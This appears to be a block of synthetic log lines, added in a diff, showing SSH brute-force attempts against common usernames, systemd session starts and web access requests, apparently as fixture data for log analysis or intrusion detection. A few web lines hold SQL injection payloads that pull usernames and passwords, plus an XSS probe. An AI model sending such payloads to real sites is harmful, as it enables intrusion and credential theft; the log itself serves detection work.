+Dec 15 14:08:18 server1 sshd[12345]: Failed password for invalid user guest from 45.154.255.147 port 31928 ssh2
+Dec 15 14:06:09 server1 sshd[12345]: Failed password for invalid user deploy from 185.220.101.46 port 59111 ssh2
+Dec 15 14:13:24 server1 sshd[12345]: Failed password for invalid user admin from 192.168.100.50 port 20059 ssh2
+Dec 15 14:05:39 server1 sshd[12345]: Failed password for invalid user guest from 91.121.87.18 port 40804 ssh2
+Dec 15 14:11:45 server1 sshd[12345]: Failed password for invalid user administrator from 192.168.100.50 port 33632 ssh2
+2024-12-15T15:50:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 64
+Dec 15 14:17:48 server1 sshd[12345]: Failed password for invalid user ubuntu from 45.154.255.147 port 52256 ssh2
+Dec 15 14:10:36 server1 sshd[12345]: Failed password for invalid user deploy from 185.220.101.46 port 17365 ssh2
+Dec 15 14:22:03 server1 sshd[12345]: Failed password for invalid user admin from 192.168.100.50 port 44547 ssh2
+2024-12-15T15:02:00.000000+0800 91.121.87.18 - - "GET /products.php?id=UNION SELECT username,password FROM users-- HTTP/1.1" 200 3143
+Dec 15 22:10:00 server1 systemd[1]: Started Session 170 of user deploy.
+Dec 15 14:25:00 server1 systemd[1]: Started Session 77 of user deploy.
+2024-12-15T16:50:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 151
+Dec 15 14:24:12 server1 sshd[12345]: Failed password for invalid user guest from 103.35.74.12 port 28992 ssh2
+2024-12-15T22:20:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 153
+Dec 15 14:11:24 server1 sshd[12345]: Failed password for invalid user deploy from 10.0.0.100 port 36218 ssh2
+2024-12-15T15:01:40.000000+0800 91.121.87.18 - - "GET /products.php?id=' OR '1'='1 HTTP/1.1" 500 3057
+2024-12-15T16:04:30.000000+0800 192.168.100.50 - - "GET /search.php?q=%3Csvg onload=alert(1)%3E HTTP/1.1" 200 622
+Dec 15 14:08:36 server1 sshd[12345]: Failed password for invalid user ubuntu from 45.154.255.147 port 33292 ssh2
+Dec 15 14:14:33 server1 sshd[12345]: Failed password for invalid user oracle from 45.154.255.147 port 56267 ssh2
+Dec 15 14:05:09 server1 sshd[12345]: Failed password for invalid user ftpuser from 91.121.87.18 port 12962 ssh2
+Dec 15 14:03:48 server1 sshd[12345]: Failed password for invalid user administrator from 192.168.100.50 port 41901 ssh2
+2024-12-16T00:20:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 102
